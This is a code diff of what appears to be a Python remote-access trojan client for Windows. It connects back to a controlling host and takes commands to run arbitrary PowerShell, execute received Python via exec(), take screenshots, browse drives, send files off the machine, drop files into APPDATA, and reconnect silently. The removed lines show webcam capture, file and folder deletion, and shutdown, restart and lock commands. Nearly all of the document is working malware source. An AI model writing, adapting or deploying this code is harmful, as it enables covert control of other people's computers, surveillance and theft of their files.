@@ -1,15 +1,14 @@
-import socket, subprocess, os, time, platform, sys, pyautogui, urllib.request, cv2, shutil
+import socket, subprocess, os, time, platform, sys, urllib.request, re, pyautogui
 from io import StringIO # Purpose: Python Interpreter (receiving output)
 
 # Socket Properties
 HOST = ""
-PORT = 3000
+PORT = 10000
+buffer = 1024
 
-# Defines (Send & Recv) Functions for use
+# Defines shorter/simpler (Send & Recv) Functions for use
 send = lambda data: objSocket.send(data)
 recv = lambda buffer: objSocket.recv(buffer)
-bufsize = 1024
-delay = 0.2
 
 # Client Properties
 appdata = os.environ["APPDATA"]
@@ -37,14 +36,14 @@ except (FileNotFoundError, Exception):
 
 # Connect to Server
 def main():
-    global objSocket
+    global objSocket, DecryptionKey
 
     while (True):
         try:
             objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             objSocket.connect((HOST, PORT))
-        except (socket.error, Exception):
-            time.sleep(4)
+        except:
+            continue
         else:
             break
 
@@ -70,10 +69,6 @@ def ClearFiles():
         os.remove(appdata+"/screenshot.png")
     else: pass
 
-    if (os.path.isfile(appdata+"/webcam.png")):
-        os.remove(appdata+"/webcam.png")
-    else: pass
-
     if (os.path.isfile(appdata+"/configure.vbs")):
         os.remove(appdata+"/configure.vbs")
     else: pass
@@ -85,57 +80,23 @@ def MessageBox(message):
     subprocess.Popen(appdata+"/msg.vbs", shell=True)
     send(b"(Message Sent)")
 
-def OpenWebpage(url):
-    if (url == "append-connection"):
-        return
-
-    subprocess.Popen("start " + url, shell=True); send(b"(Webpage Opened)")
-
 def Screenshot():
     try:
-        pyautogui.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(delay); send(str(os.path.getsize(appdata+"/screenshot.png")).encode()); time.sleep(delay)
+        pyautogui.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(0.3); send(str(os.path.getsize(appdata+"/screenshot.png")).encode()); time.sleep(0.3)
         with open(appdata+"/screenshot.png", "rb") as ImageFile:
             send(ImageFile.read())
-    except:
-        send(b"error")
-
-def Webcam():
-    try:
-        webcam = cv2.VideoCapture(0)
-        return_value, image = webcam.read()
-        cv2.imwrite(appdata+"/webcam.png", image)
-        del(webcam); send(b"success")
-
-        try:
-            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"],
-                                                                      stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=12, shell=True)
-            Webcam_Name = result.split(b"Name=")[1].split(b"}")[0].decode()
-        except:
-            Webcam_Name = "Not Found"
-
-        send(str(os.path.getsize(appdata+"/webcam.png")).encode()); time.sleep(delay); send(Webcam_Name.encode()); time.sleep(delay)
-        with open(appdata+"/webcam.png", "rb") as ImageFile:
-            send(ImageFile.read())
-
-    except (cv2.error, Exception):
-        send(b"error")
-
-def StartProcess(process):
-    if not (os.path.isfile(process)):
-        send(b"INVALID")
-        return
-
-    send(b"VALID"); subprocess.Popen(process, shell=True)
+    except Exception as ScreenshotError:
+        send(bytes(str(ScreenshotError), "utf-8"))
 
 def PythonInterpreter():
-    ServerCode = recv(bufsize).decode()
-    if (ServerCode == "not-sending"):
-        return
-
+    ServerCode = recv(buffer).decode()
     Redirected_Output = sys.stdout = StringIO()
 
     try:
-        exec(ServerCode); send("SUCCESS".encode()); time.sleep(delay); send(Redirected_Output.getvalue().encode())
+        exec(ServerCode); send(b"SUCCESS"); time.sleep(0.3); send(Redirected_Output.getvalue().encode())
+        if not (re.findall("print", ServerCode)):
+            send(b"no-output")
+
     except SyntaxError as se:
         send(f"Syntax Error: ({se})".encode())
     except NameError as ne:
@@ -148,32 +109,28 @@ def PythonInterpreter():
         send(f"Overflow Error: ({ofe})".encode())
     except Exception as e:
         send(f"Error: ({e})".encode())
-    else:
-        send(b"<No Output>")
 
 def RemoteCMD():
-    CurrentDirectory = os.getcwd()
-    send(CurrentDirectory.encode())
-
+    send(bytes(os.getcwd(), "utf-8"))
     while (True):
-        ServerInput = recv(bufsize).decode()
-        if (ServerInput == "close-cmd"):
+        ServerCommand = recv(buffer).decode()
+        if (ServerCommand == "exit"):
             break
 
-        elif (len(ServerInput) > 0):
-            CMD_Command = subprocess.Popen(ServerInput, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            CMD_Output = CMD_Command.stdout.read() + CMD_Command.stderr.read()
-            OutputData = (CMD_Output + b"\n")
+        if (len(ServerCommand) > 0):
+            PS_Command = subprocess.Popen(["powershell.exe", ServerCommand], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            CMD_Output = PS_Command.stdout.read() + PS_Command.stderr.read()
         else:
-            OutputData = b"Error Occured"
+            CMD_Output = b"Error Occured"
 
-        send(OutputData)
+        send(bytes(str(len(CMD_Output)), "utf-8")); time.sleep(0.3)
+        send(CMD_Output)
 
 def ViewFiles():
     drives = [chr(x) + ":/" for x in range(65,91) if os.path.isdir(chr(x) + ":/")]
     send(" ".join(drives).encode())
 
-    directory = recv(bufsize).decode()
+    directory = recv(buffer).decode()
     if not (os.path.isdir(directory)):
         send(b"INVALID")
         return
@@ -182,15 +139,15 @@ def ViewFiles():
     buffersize = str(len("\n".join(os.listdir(directory))))
     files = "\n".join(os.listdir(directory))
 
-    send(b"VALID"); time.sleep(delay); send(Number_Of_Files.encode()); time.sleep(delay); send(buffersize.encode())
-    time.sleep(delay); send(files.encode())
+    send(b"VALID"); time.sleep(0.3); send(Number_Of_Files.encode()); time.sleep(0.3); send(buffersize.encode())
+    time.sleep(0.3); send(files.encode())
 
 def SendFile(filepath):
     if not (os.path.isfile(filepath)):
         send(b"error")
         return
 
-    send(b"success"); time.sleep(delay); send(os.path.basename(filepath).encode()); time.sleep(delay); send(str(os.path.getsize(filepath)).encode())
+    send(b"success"); time.sleep(0.3); send(os.path.basename(filepath).encode()); time.sleep(0.3); send(str(os.path.getsize(filepath)).encode())
     with open(filepath, "rb") as file:
         send(file.read())
 
@@ -198,31 +155,9 @@ def ReceiveFile(filename, buffersize):
     with open(appdata+"/"+filename, "wb") as file:
         file.write(recvall(buffersize))
 
-    send(b"(File Sent)")
-
-def Delete():
-    ServerInput = recv(bufsize).decode()
-    if (ServerInput == "del-file"):
-        file = recv(bufsize).decode()
-
-        if (os.path.isfile(file)):
-            send(b"success"); os.remove(file)
-        else:
-            send(b"error")
-
-    elif (ServerInput == "del-dir"):
-        directory = recv(bufsize).decode()
-        if (os.path.isdir(directory)):
-            send(b"success"); shutil.rmtree(directory, ignore_errors=True)
-        else:
-            send(b"error")
-
-    elif (ServerInput == "error"):
-        return
-
 while (True):
     try:
-        ServerCommand = recv(bufsize).decode()
+        ServerCommand = recv(buffer).decode()
         if not ServerCommand:
             objSocket.close(); del(objSocket); main()
 
@@ -233,19 +168,10 @@ while (True):
             ClearFiles(); objSocket.close(); del(objSocket); main()
 
         elif (ServerCommand == "message-box"):
-            MessageBox(recv(bufsize).decode())
-
-        elif (ServerCommand == "open-webpage"):
-            OpenWebpage(url=recv(bufsize).decode())
+            MessageBox(recv(buffer).decode())
 
         elif (ServerCommand == "capture-screenshot"):
             Screenshot()
-
-        elif (ServerCommand == "capture-webcam"):
-            Webcam()
-
-        elif (ServerCommand == "start-process"):
-            StartProcess(recv(bufsize).decode())
 
         elif (ServerCommand == "python-interpreter"):
             PythonInterpreter()
@@ -253,29 +179,17 @@ while (True):
         elif (ServerCommand == "remote-cmd"):
             RemoteCMD()
 
-        elif (ServerCommand == "shutdown-pc"):
-            send(b"Powering Off"); subprocess.Popen("shutdown /p", shell=True)
-
-        elif (ServerCommand == "restart-pc"):
-            send(b"Computer Restarting"); subprocess.Popen("shutdown /r", shell=True)
-
-        elif (ServerCommand == "lock-pc"):
-            send(b"Computer Locked"); subprocess.Popen("rundll32.exe user32.dll,LockWorkStation", shell=True)
-
         elif (ServerCommand == "current-dir"):
-            send(os.getcwd().encode());
+            send(os.getcwd().encode())
 
         elif (ServerCommand == "view-files"):
             ViewFiles()
 
         elif (ServerCommand == "receive-file"):
-            SendFile(filepath=recv(bufsize).decode())
+            SendFile(filepath=recv(buffer).decode())
 
         elif (ServerCommand == "send-file"):
-            ReceiveFile(filename=recv(bufsize).decode(), buffersize=int(recv(bufsize).decode()))
+            ReceiveFile(filename=recv(buffer).decode(), buffersize=int(recv(buffer).decode()))
 
-        elif (ServerCommand == "delete"):
-            Delete()
-
-    except (socket.error, Exception):
+    except:
         ClearFiles(); objSocket.close(); del(objSocket); main()
